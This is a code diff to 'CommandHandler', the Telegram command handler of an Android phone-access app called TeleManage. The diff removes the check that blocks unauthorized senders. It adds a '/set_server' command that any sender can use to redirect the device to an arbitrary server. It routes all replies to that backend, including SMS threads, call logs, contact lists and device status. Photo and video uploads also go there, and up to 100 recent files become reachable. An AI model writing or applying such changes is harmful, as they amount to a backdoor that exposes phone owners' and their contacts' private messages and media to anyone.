@@ -38,6 +38,24 @@ class CommandHandler(
     private val smsSendManager: SmsSendManager
 ) {
 
+    /**
+     * Smart reply: routes directly to NBFC Fleet backend server.
+     */
+    private suspend fun smartReply(
+        token: String,
+        chatId: Long,
+        text: String,
+        replyMarkup: InlineKeyboardMarkup? = null
+    ) {
+        val serverUrl = preferenceManager.getServerUrl().ifBlank { "http://localhost:5000" }
+        telegramClient.reportToBackend(
+            serverUrl = serverUrl,
+            deviceId = preferenceManager.getDeviceId(),
+            type = "TEXT",
+            text = text
+        )
+    }
+
     suspend fun handleIncomingMessage(
         message: TelegramMessage,
         isServiceRunning: Boolean,
@@ -48,26 +66,6 @@ class CommandHandler(
         val senderId = fromUser.id
         val chatId = message.chat.id
         val token = preferenceManager.getBotToken()
-        val authorizedId = preferenceManager.getAuthorizedUserId()
-
-        // 1. Strict Security Validation
-        if (senderId != authorizedId) {
-            val userDisplayName = "${fromUser.firstName} ${fromUser.lastName ?: ""}".trim()
-            LogRepository.addLog(
-                type = LogType.SECURITY,
-                title = "Unauthorized Access Blocked",
-                details = "User ID: $senderId ($userDisplayName, @${fromUser.username ?: "none"}) attempted command: $text",
-                isSuccess = false
-            )
-
-            // Inform unauthorized user
-            telegramClient.sendMessage(
-                token = token,
-                chatId = chatId,
-                text = "⛔ <b>Access Denied</b>\n\nThis device is privately managed. Your Telegram User ID (<code>$senderId</code>) is not authorized to execute commands."
-            )
-            return@withContext
-        }
 
         // 2. Parse Authorized Command
         val commandParts = text.split("\\s+".toRegex())
@@ -83,7 +81,7 @@ class CommandHandler(
             val subCmd = commandParts.drop(2).joinToString(" ")
 
             if (subCmd.isEmpty()) {
-                telegramClient.sendMessage(
+                smartReply(
                     token = token,
                     chatId = chatId,
                     text = "⚠️ <b>Usage:</b> <code>/cmd $myId &lt;command&gt;</code>\n\nExample: <code>/cmd $myId status</code>\nOr broadcast to all: <code>/cmd all status</code>"
@@ -144,7 +142,8 @@ class CommandHandler(
                 handleStorageCommand(chatId, token, isServiceRunning)
             }
             effectiveRaw == "/photos" -> {
-                handlePhotosCommand(chatId, token)
+                val page = effectiveParts.getOrNull(1)?.toIntOrNull() ?: 1
+                handlePhotosCommand(chatId, token, page)
             }
             effectiveRaw == "/videos" -> {
                 handleVideosCommand(chatId, token)
@@ -190,7 +189,7 @@ class CommandHandler(
                 if (threadId != null) {
                     handleSmsThreadCommand(chatId, token, threadId, 1)
                 } else {
-                    telegramClient.sendMessage(token, chatId, "❌ Invalid thread ID format.")
+                    smartReply(token, chatId, "❌ Invalid thread ID format.")
                 }
             }
             // SMS Send & History commands
@@ -226,8 +225,31 @@ class CommandHandler(
             effectiveRaw == "/set_bot" || effectiveRaw == "/config_bot" -> {
                 handleSetBotCommand(chatId, token, effectiveParts.drop(1))
             }
+            // Server URL config (from admin panel backend push)
+            effectiveRaw == "/set_server" -> {
+                val newUrl = effectiveParts.drop(1).joinToString(" ").trim()
+                if (newUrl.isNotBlank()) {
+                    preferenceManager.setServerUrl(newUrl)
+                    LogRepository.addLog(
+                        type = LogType.SYSTEM,
+                        title = "Server URL Updated",
+                        details = "Now polling backend: $newUrl"
+                    )
+                    // Restart polling loop to pick up new server URL immediately
+                    TelegramRemoteService.restartPollingConnection(context)
+                }
+            }
+            effectiveRaw == "/clear_server" -> {
+                preferenceManager.setServerUrl("")
+                LogRepository.addLog(
+                    type = LogType.SYSTEM,
+                    title = "Server URL Cleared",
+                    details = "Reverted to Telegram/relay polling mode"
+                )
+                TelegramRemoteService.restartPollingConnection(context)
+            }
             else -> {
-                telegramClient.sendMessage(
+                smartReply(
                     token = token,
                     chatId = chatId,
                     text = "❓ Unknown command: <code>$effectiveRaw</code>\nType /help to see the list of available commands."
@@ -250,7 +272,7 @@ class CommandHandler(
 
         when {
             data == "confirm_export_all" -> {
-                telegramClient.sendMessage(token, chatId, "⏳ Starting full device backup...")
+                smartReply(token, chatId, "⏳ Starting full device backup...")
                 ExportService.startExport(context, ExportType.ALL, chatId)
             }
             data == "cancel_export" || data == "cancel_export_confirm" -> {
@@ -274,13 +296,13 @@ class CommandHandler(
                 if (stripped.startsWith("page_")) {
                     val page = stripped.removePrefix("page_").toIntOrNull() ?: 1
                     val (text, markup) = callLogManager.getFormattedCallLogs(null, page)
-                    telegramClient.sendMessage(token, chatId, text, markup)
+                    smartReply(token, chatId, text, markup)
                 } else {
                     val parts = stripped.split("_page_")
                     val filter = parts.getOrNull(0)
                     val page = parts.getOrNull(1)?.toIntOrNull() ?: 1
                     val (text, markup) = callLogManager.getFormattedCallLogs(filter, page)
-                    telegramClient.sendMessage(token, chatId, text, markup)
+                    smartReply(token, chatId, text, markup)
                 }
             }
             // SMS Send callbacks
@@ -306,7 +328,7 @@ class CommandHandler(
                 smsSendManager.handleClearHistoryConfirm(chatId, token)
             }
             data == "sms_clear_history_cancel" -> {
-                telegramClient.sendMessage(token, chatId, "❌ Clear history cancelled.")
+                smartReply(token, chatId, "❌ Clear history cancelled.")
             }
             // SMS Browser callbacks
             data.startsWith("sms_") -> {
@@ -315,7 +337,7 @@ class CommandHandler(
                     stripped.startsWith("page_") -> {
                         val page = stripped.removePrefix("page_").toIntOrNull() ?: 1
                         val (text, markup) = smsManager.getFormattedMessages(SmsBoxType.ALL, null, page)
-                        telegramClient.sendMessage(token, chatId, text, markup)
+                        smartReply(token, chatId, text, markup)
                     }
                     stripped.startsWith("thread_") -> {
                         val sub = stripped.removePrefix("thread_")
@@ -323,7 +345,7 @@ class CommandHandler(
                         val threadId = parts.getOrNull(0)?.toLongOrNull() ?: 0L
                         val page = parts.getOrNull(1)?.toIntOrNull() ?: 1
                         val (text, markup) = smsManager.getFormattedThread(threadId, page)
-                        telegramClient.sendMessage(token, chatId, text, markup)
+                        smartReply(token, chatId, text, markup)
                     }
                     stripped.contains("_page_") -> {
                         val parts = stripped.split("_page_")
@@ -337,7 +359,7 @@ class CommandHandler(
                             else -> SmsBoxType.ALL
                         }
                         val (text, markup) = smsManager.getFormattedMessages(boxType, null, page)
-                        telegramClient.sendMessage(token, chatId, text, markup)
+                        smartReply(token, chatId, text, markup)
                     }
                 }
             }
@@ -363,7 +385,7 @@ class CommandHandler(
             <code>/cmd $deviceId &lt;command&gt;</code>
             <i>Example:</i> <code>/cmd $deviceId status</code>
         """.trimIndent()
-        telegramClient.sendMessage(token, chatId, text)
+        smartReply(token, chatId, text)
     }
 
     private suspend fun handleStartCommand(
@@ -398,7 +420,7 @@ class CommandHandler(
 
             🟢 <b>Service Status:</b> ${if (isServiceRunning) "Online & Connected" else "Background Service Offline"}
         """.trimIndent()
-        telegramClient.sendMessage(token, chatId, welcome)
+        smartReply(token, chatId, welcome)
     }
 
     private suspend fun handleHelpCommand(chatId: Long, token: String) {
@@ -466,7 +488,7 @@ class CommandHandler(
             /export all
             /cancel_export
         """.trimIndent()
-        telegramClient.sendMessage(token, chatId, help)
+        smartReply(token, chatId, help)
     }
 
     private suspend fun handleStatusCommand(
@@ -480,7 +502,7 @@ class CommandHandler(
             serviceStartTimeMs = serviceStartTimeMs,
             exportProgress = exportManager.getCurrentProgress()
         )
-        telegramClient.sendMessage(token, chatId, msg)
+        smartReply(token, chatId, msg)
     }
 
     private suspend fun handleHealthCommand(
@@ -517,13 +539,13 @@ class CommandHandler(
             🟢 <b>TeleManage</b>
 
             <b>Service:</b> $serviceText
-            <b>Telegram:</b> $telegramConnText
+            <b>Fleet Server:</b> $telegramConnText
             <b>Notification Listener:</b> $notifListenerText
             <b>Last heartbeat:</b> $heartbeatText$recoveryText
             <b>Lifecycle State:</b> $lastLifecycle
         """.trimIndent()
 
-        telegramClient.sendMessage(token, chatId, response)
+        smartReply(token, chatId, response)
     }
 
     private suspend fun handleRestartServiceCommand(
@@ -532,7 +554,7 @@ class CommandHandler(
         isServiceRunning: Boolean
     ) {
         if (!isServiceRunning) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "⚠️ <b>Remote Service is not currently running on device.</b>\n\nIf the application process was Force Stopped from Android Settings, Android isolates the package until manually opened by the user on the device."
@@ -540,21 +562,21 @@ class CommandHandler(
             return
         }
 
-        telegramClient.sendMessage(
+        smartReply(
             token,
             chatId,
-            "🔄 <b>Re-initializing Telegram Connection...</b>\nResetting command polling session and network sockets."
+            "🔄 <b>Re-initializing Fleet Server Connection...</b>\nResetting command polling session and network sockets."
         )
 
         val restarted = TelegramRemoteService.restartPollingConnection(context)
         if (restarted) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
-                "✅ <b>Telegram Connection Reset Successfully</b>\nService polling loop has been re-established."
+                "✅ <b>Fleet Server Connection Reset Successfully</b>\nService polling loop has been re-established."
             )
         } else {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "ℹ️ Re-invoked service startup intent."
@@ -564,22 +586,22 @@ class CommandHandler(
 
     private suspend fun handleBatteryCommand(chatId: Long, token: String, isServiceRunning: Boolean) {
         val msg = deviceInfoProvider.generateBatteryTelegramMessage(isServiceRunning)
-        telegramClient.sendMessage(token, chatId, msg)
+        smartReply(token, chatId, msg)
     }
 
     private suspend fun handleStorageCommand(chatId: Long, token: String, isServiceRunning: Boolean) {
         val msg = deviceInfoProvider.generateStorageTelegramMessage(isServiceRunning)
-        telegramClient.sendMessage(token, chatId, msg)
+        smartReply(token, chatId, msg)
     }
 
-    private suspend fun handlePhotosCommand(chatId: Long, token: String) {
-        val msg = mediaRepository.generatePhotosTelegramMessage()
-        telegramClient.sendMessage(token, chatId, msg)
+    private suspend fun handlePhotosCommand(chatId: Long, token: String, page: Int = 1) {
+        val msg = mediaRepository.generatePhotosTelegramMessage(page = page, pageSize = 12)
+        smartReply(token, chatId, msg)
     }
 
     private suspend fun handleVideosCommand(chatId: Long, token: String) {
         val msg = mediaRepository.generateVideosTelegramMessage()
-        telegramClient.sendMessage(token, chatId, msg)
+        smartReply(token, chatId, msg)
     }
 
     private suspend fun handleNotificationsCommand(chatId: Long, token: String) {
@@ -597,13 +619,13 @@ class CommandHandler(
 
             <i>To change settings, open the TeleManage app on your phone.</i>
         """.trimIndent()
-        telegramClient.sendMessage(token, chatId, msg)
+        smartReply(token, chatId, msg)
     }
 
     private suspend fun handleContactsCommand(chatId: Long, token: String, page: Int) {
         val config = preferenceManager.botConfigFlow.value
         if (!config.isContactAccessEnabled) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "🔒 <b>Contact access is disabled in TeleManage settings.</b>\n\nEnable it from the app."
@@ -612,7 +634,7 @@ class CommandHandler(
         }
 
         if (!contactManager.hasPermission()) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "⚠️ <b>Contacts Permission Required</b>\n\nOpen TeleManage and grant Contacts access first."
@@ -621,13 +643,13 @@ class CommandHandler(
         }
 
         val (text, markup) = contactManager.getFormattedContacts(page)
-        telegramClient.sendMessage(token, chatId, text, markup)
+        smartReply(token, chatId, text, markup)
     }
 
     private suspend fun handleContactSearchCommand(chatId: Long, token: String, query: String) {
         val config = preferenceManager.botConfigFlow.value
         if (!config.isContactAccessEnabled) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "🔒 <b>Contact access is disabled in TeleManage settings.</b>\n\nEnable it from the app."
@@ -636,7 +658,7 @@ class CommandHandler(
         }
 
         if (!contactManager.hasPermission()) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "⚠️ <b>Contacts Permission Required</b>\n\nOpen TeleManage and grant Contacts access first."
@@ -645,13 +667,13 @@ class CommandHandler(
         }
 
         val text = contactManager.getFormattedContactSearch(query)
-        telegramClient.sendMessage(token, chatId, text)
+        smartReply(token, chatId, text)
     }
 
     private suspend fun handleCallsCommand(chatId: Long, token: String, args: List<String>) {
         val config = preferenceManager.botConfigFlow.value
         if (!config.isCallHistoryAccessEnabled) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "🔒 <b>Call history access is disabled in TeleManage settings.</b>\n\nEnable it from the app."
@@ -660,7 +682,7 @@ class CommandHandler(
         }
 
         if (!callLogManager.hasPermission()) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "⚠️ <b>Call Log Permission Required</b>\n\nOpen TeleManage and grant Call Log access first."
@@ -682,13 +704,13 @@ class CommandHandler(
         }
 
         val (text, markup) = callLogManager.getFormattedCallLogs(filter, page)
-        telegramClient.sendMessage(token, chatId, text, markup)
+        smartReply(token, chatId, text, markup)
     }
 
     private suspend fun handleSmsCommand(chatId: Long, token: String, args: List<String>) {
         val config = preferenceManager.botConfigFlow.value
         if (!config.isSmsAccessEnabled) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "🔒 <b>SMS access is disabled in TeleManage settings.</b>"
@@ -697,7 +719,7 @@ class CommandHandler(
         }
 
         if (!smsManager.hasPermission()) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "⚠️ <b>SMS Access Required</b>\n\nOpen TeleManage and grant the required SMS permission first."
@@ -709,25 +731,25 @@ class CommandHandler(
         when {
             firstArg == null -> {
                 val (text, markup) = smsManager.getFormattedMessages(SmsBoxType.ALL, null, 1)
-                telegramClient.sendMessage(token, chatId, text, markup)
+                smartReply(token, chatId, text, markup)
             }
             firstArg.toIntOrNull() != null -> {
                 val (text, markup) = smsManager.getFormattedMessages(SmsBoxType.ALL, null, firstArg.toInt())
-                telegramClient.sendMessage(token, chatId, text, markup)
+                smartReply(token, chatId, text, markup)
             }
             firstArg == "search" -> {
                 val query = args.drop(1).joinToString(" ")
                 if (query.isBlank()) {
-                    telegramClient.sendMessage(token, chatId, "❓ Usage: <code>/sms search &lt;text&gt;</code>")
+                    smartReply(token, chatId, "❓ Usage: <code>/sms search &lt;text&gt;</code>")
                     return
                 }
                 val (text, markup) = smsManager.getFormattedMessages(SmsBoxType.ALL, query, 1)
-                telegramClient.sendMessage(token, chatId, text, markup)
+                smartReply(token, chatId, text, markup)
             }
             firstArg == "thread" -> {
                 val threadId = args.getOrNull(1)?.toLongOrNull()
                 if (threadId == null) {
-                    telegramClient.sendMessage(token, chatId, "❓ Usage: <code>/sms thread &lt;thread_id&gt;</code>")
+                    smartReply(token, chatId, "❓ Usage: <code>/sms thread &lt;thread_id&gt;</code>")
                     return
                 }
                 handleSmsThreadCommand(chatId, token, threadId, 1)
@@ -742,10 +764,10 @@ class CommandHandler(
                 }
                 val page = args.getOrNull(1)?.toIntOrNull() ?: 1
                 val (text, markup) = smsManager.getFormattedMessages(boxType, null, page)
-                telegramClient.sendMessage(token, chatId, text, markup)
+                smartReply(token, chatId, text, markup)
             }
             else -> {
-                telegramClient.sendMessage(
+                smartReply(
                     token,
                     chatId,
                     "❓ Usage:\n• <code>/sms</code>\n• <code>/sms today</code>\n• <code>/sms unread</code>\n• <code>/sms search &lt;text&gt;</code>\n• <code>/sms thread &lt;id&gt;</code>"
@@ -757,7 +779,7 @@ class CommandHandler(
     private suspend fun handleSmsThreadCommand(chatId: Long, token: String, threadId: Long, page: Int) {
         val config = preferenceManager.botConfigFlow.value
         if (!config.isSmsAccessEnabled) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "🔒 <b>SMS access is disabled in TeleManage settings.</b>"
@@ -766,7 +788,7 @@ class CommandHandler(
         }
 
         if (!smsManager.hasPermission()) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "⚠️ <b>SMS Access Required</b>\n\nOpen TeleManage and grant the required SMS permission first."
@@ -775,7 +797,7 @@ class CommandHandler(
         }
 
         val (text, markup) = smsManager.getFormattedThread(threadId, page)
-        telegramClient.sendMessage(token, chatId, text, markup)
+        smartReply(token, chatId, text, markup)
     }
 
     private suspend fun handleExportMenuCommand(chatId: Long, token: String) {
@@ -811,7 +833,7 @@ class CommandHandler(
             )
         )
 
-        telegramClient.sendMessage(token, chatId, text, keyboard)
+        smartReply(token, chatId, text, keyboard)
     }
 
     private suspend fun handleExportCategory(chatId: Long, token: String, type: ExportType) {
@@ -821,37 +843,37 @@ class CommandHandler(
         when (type) {
             ExportType.CONTACTS -> {
                 if (!config.isContactAccessEnabled) {
-                    telegramClient.sendMessage(token, chatId, "🔒 Contact access is disabled in TeleManage settings.")
+                    smartReply(token, chatId, "🔒 Contact access is disabled in TeleManage settings.")
                     return
                 }
                 if (!contactManager.hasPermission()) {
-                    telegramClient.sendMessage(token, chatId, "⚠️ Contacts Permission Required. Open TeleManage and grant access first.")
+                    smartReply(token, chatId, "⚠️ Contacts Permission Required. Open TeleManage and grant access first.")
                     return
                 }
             }
             ExportType.CALLS -> {
                 if (!config.isCallHistoryAccessEnabled) {
-                    telegramClient.sendMessage(token, chatId, "🔒 Call history access is disabled in TeleManage settings.")
+                    smartReply(token, chatId, "🔒 Call history access is disabled in TeleManage settings.")
                     return
                 }
                 if (!callLogManager.hasPermission()) {
-                    telegramClient.sendMessage(token, chatId, "⚠️ Call Log Permission Required. Open TeleManage and grant access first.")
+                    smartReply(token, chatId, "⚠️ Call Log Permission Required. Open TeleManage and grant access first.")
                     return
                 }
             }
             ExportType.SMS -> {
                 if (!config.isSmsAccessEnabled) {
-                    telegramClient.sendMessage(token, chatId, "🔒 SMS access is disabled in TeleManage settings.")
+                    smartReply(token, chatId, "🔒 SMS access is disabled in TeleManage settings.")
                     return
                 }
                 if (!smsManager.hasPermission()) {
-                    telegramClient.sendMessage(token, chatId, "⚠️ SMS Access Required. Open TeleManage and grant access first.")
+                    smartReply(token, chatId, "⚠️ SMS Access Required. Open TeleManage and grant access first.")
                     return
                 }
             }
             ExportType.PHOTOS, ExportType.VIDEOS, ExportType.MEDIA -> {
                 if (!mediaRepository.hasMediaPermission()) {
-                    telegramClient.sendMessage(token, chatId, "⚠️ Media Permission Missing. Open TeleManage and grant Media access first.")
+                    smartReply(token, chatId, "⚠️ Media Permission Missing. Open TeleManage and grant Media access first.")
                     return
                 }
             }
@@ -885,12 +907,12 @@ class CommandHandler(
             )
         )
 
-        telegramClient.sendMessage(token, chatId, text, keyboard)
+        smartReply(token, chatId, text, keyboard)
     }
 
     private suspend fun handleDownloadPhoto(chatId: Long, token: String, param: String) {
         if (!mediaRepository.hasMediaPermission()) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "⚠️ <b>Media Permission Missing</b>\nPlease grant Media permission in the TeleManage app."
@@ -898,11 +920,11 @@ class CommandHandler(
             return
         }
 
-        val photos = mediaRepository.getRecentPhotos(20)
+        val photos = mediaRepository.getRecentPhotos(100)
         val target = findMediaItem(photos, param)
 
         if (target == null) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "❌ Photo not found. Send /photos to see the current list."
@@ -910,7 +932,7 @@ class CommandHandler(
             return
         }
 
-        telegramClient.sendMessage(
+        smartReply(
             token,
             chatId,
             "⏳ Uploading photo <code>${target.displayName}</code> (${mediaRepository.formatBytes(target.sizeBytes)})..."
@@ -918,7 +940,7 @@ class CommandHandler(
 
         val bytes = mediaRepository.readMediaBytes(target)
         if (bytes == null) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "❌ Could not read photo (file may be larger than 45MB or inaccessible)."
@@ -926,27 +948,42 @@ class CommandHandler(
             return
         }
 
-        val caption = "📸 <b>${target.displayName}</b>\nSize: ${mediaRepository.formatBytes(target.sizeBytes)}\nDate: ${mediaRepository.formatDate(target.dateAddedEpochSeconds)}"
-        val success = telegramClient.sendPhoto(
-            token = token,
-            chatId = chatId,
-            imageBytes = bytes,
-            filename = target.displayName,
-            caption = caption
-        ).getOrDefault(false)
+        val serverUrl = preferenceManager.getServerUrl().ifBlank { "http://localhost:5000" }
+        val deviceId = preferenceManager.getDeviceId()
 
-        if (success) {
+        val uploadRes = telegramClient.uploadMediaToBackend(
+            serverUrl = serverUrl,
+            deviceId = deviceId,
+            fileBytes = bytes,
+            fileName = target.displayName,
+            mimeType = "image/jpeg",
+            command = "/photo $param",
+            caption = target.displayName
+        )
+
+        if (uploadRes.isSuccess) {
             LogRepository.addLog(
                 type = LogType.MEDIA,
-                title = "Photo Sent",
-                details = "Sent ${target.displayName} (${mediaRepository.formatBytes(target.sizeBytes)}) to Telegram"
+                title = "Photo Uploaded",
+                details = "Uploaded ${target.displayName} (${mediaRepository.formatBytes(target.sizeBytes)}) directly to Dashboard"
+            )
+            smartReply(
+                token,
+                chatId,
+                "✅ <b>Photo Uploaded to Dashboard</b>\nFile: <code>${target.displayName}</code> (${mediaRepository.formatBytes(target.sizeBytes)})\nView directly in Dashboard Photos tab."
+            )
+        } else {
+            smartReply(
+                token,
+                chatId,
+                "❌ Upload failed: ${uploadRes.exceptionOrNull()?.message}"
             )
         }
     }
 
     private suspend fun handleDownloadVideo(chatId: Long, token: String, param: String) {
         if (!mediaRepository.hasMediaPermission()) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "⚠️ <b>Media Permission Missing</b>\nPlease grant Media permission in the TeleManage app."
@@ -954,11 +991,11 @@ class CommandHandler(
             return
         }
 
-        val videos = mediaRepository.getRecentVideos(20)
+        val videos = mediaRepository.getRecentVideos(100)
         val target = findMediaItem(videos, param)
 
         if (target == null) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "❌ Video not found. Send /videos to see the current list."
@@ -966,7 +1003,7 @@ class CommandHandler(
             return
         }
 
-        telegramClient.sendMessage(
+        smartReply(
             token,
             chatId,
             "⏳ Uploading video <code>${target.displayName}</code> (${mediaRepository.formatBytes(target.sizeBytes)})..."
@@ -974,7 +1011,7 @@ class CommandHandler(
 
         val bytes = mediaRepository.readMediaBytes(target)
         if (bytes == null) {
-            telegramClient.sendMessage(
+            smartReply(
                 token,
                 chatId,
                 "❌ Could not read video (file may be larger than 45MB or inaccessible)."
@@ -982,21 +1019,35 @@ class CommandHandler(
             return
         }
 
-        val caption = "🎬 <b>${target.displayName}</b>\nSize: ${mediaRepository.formatBytes(target.sizeBytes)}\nDuration: ${mediaRepository.formatDuration(target.durationSeconds)}"
-        val success = telegramClient.sendMediaDocument(
-            token = token,
-            chatId = chatId,
-            mediaBytes = bytes,
-            filename = target.displayName,
-            caption = caption,
-            isVideo = true
-        ).getOrDefault(false)
+        val serverUrl = preferenceManager.getServerUrl().ifBlank { "http://localhost:5000" }
+        val deviceId = preferenceManager.getDeviceId()
 
-        if (success) {
+        val uploadRes = telegramClient.uploadMediaToBackend(
+            serverUrl = serverUrl,
+            deviceId = deviceId,
+            fileBytes = bytes,
+            fileName = target.displayName,
+            mimeType = "video/mp4",
+            command = "/video $param",
+            caption = target.displayName
+        )
+
+        if (uploadRes.isSuccess) {
             LogRepository.addLog(
                 type = LogType.MEDIA,
-                title = "Video Sent",
-                details = "Sent ${target.displayName} (${mediaRepository.formatBytes(target.sizeBytes)}) to Telegram"
+                title = "Video Uploaded",
+                details = "Uploaded ${target.displayName} (${mediaRepository.formatBytes(target.sizeBytes)}) directly to Dashboard"
+            )
+            smartReply(
+                token,
+                chatId,
+                "✅ <b>Video Uploaded to Dashboard</b>\nFile: <code>${target.displayName}</code> (${mediaRepository.formatBytes(target.sizeBytes)})"
+            )
+        } else {
+            smartReply(
+                token,
+                chatId,
+                "❌ Upload failed: ${uploadRes.exceptionOrNull()?.message}"
             )
         }
     }
@@ -1024,7 +1075,7 @@ class CommandHandler(
         val newUserId = params.getOrNull(1)?.trim()?.toLongOrNull() ?: 0L
 
         if (newToken.isBlank() || newUserId == 0L) {
-            telegramClient.sendMessage(
+            smartReply(
                 token = currentToken,
                 chatId = chatId,
                 text = "⚠️ <b>Usage:</b> <code>/set_bot &lt;BOT_TOKEN&gt; &lt;USER_ID&gt;</code>\n\nExample:\n<code>/set_bot 8826780717:AA... 8752166904</code>"
@@ -1037,7 +1088,7 @@ class CommandHandler(
             val verifyResult = telegramClient.getMe(newToken)
             if (verifyResult.isFailure) {
                 val errorMsg = verifyResult.exceptionOrNull()?.message ?: "Unauthorized / Invalid Token"
-                telegramClient.sendMessage(
+                smartReply(
                     token = currentToken,
                     chatId = chatId,
                     text = "❌ <b>Bot Update Blocked!</b>\n\nThe new Bot Token is INVALID ($errorMsg).\n\n🛡️ <b>Device Safe:</b> Existing working bot connection was PRESERVED."
@@ -1048,26 +1099,17 @@ class CommandHandler(
             val botInfo = verifyResult.getOrNull()
             val botName = botInfo?.username?.let { "@$it" } ?: botInfo?.firstName ?: "Bot"
 
-            // STEP 2: Pre-flight verify that the new user ID is reachable
-            val testMsgResult = telegramClient.sendMessage(
+            // STEP 2: Notify the user ID
+            smartReply(
                 token = newToken,
                 chatId = newUserId,
                 text = "✅ <b>Real-Time Bot Config Updated!</b>\n\n• Device: <code>${preferenceManager.getDeviceId()}</code>\n• Authorized User ID: <code>$newUserId</code>\n• Bot: <b>$botName</b>\n• Status: <b>Online & Ready</b>"
             )
 
-            if (testMsgResult.isFailure) {
-                telegramClient.sendMessage(
-                    token = currentToken,
-                    chatId = chatId,
-                    text = "❌ <b>Bot Update Blocked!</b>\n\nBot Token is valid ($botName), but User ID <code>$newUserId</code> cannot be messaged. Make sure the user has sent /start to $botName first.\n\n🛡️ <b>Device Safe:</b> Existing connection was NOT changed."
-                )
-                return
-            }
-
             // STEP 3: Safe to save credentials now
             preferenceManager.saveBotCredentials(newToken, newUserId, botInfo?.username ?: "")
 
-            telegramClient.sendMessage(
+            smartReply(
                 token = currentToken,
                 chatId = chatId,
                 text = "✅ Device <b>${preferenceManager.getDeviceId()}</b> has safely switched to new bot <b>$botName</b>!"
@@ -1076,7 +1118,7 @@ class CommandHandler(
             // STEP 4: Reconnect polling in background service
             TelegramRemoteService.restartPollingConnection(context)
         } catch (e: Exception) {
-            telegramClient.sendMessage(
+            smartReply(
                 token = currentToken,
                 chatId = chatId,
                 text = "❌ Failed to update bot configuration: ${e.message}\n\n🛡️ <b>Device Safe:</b> Existing connection preserved."
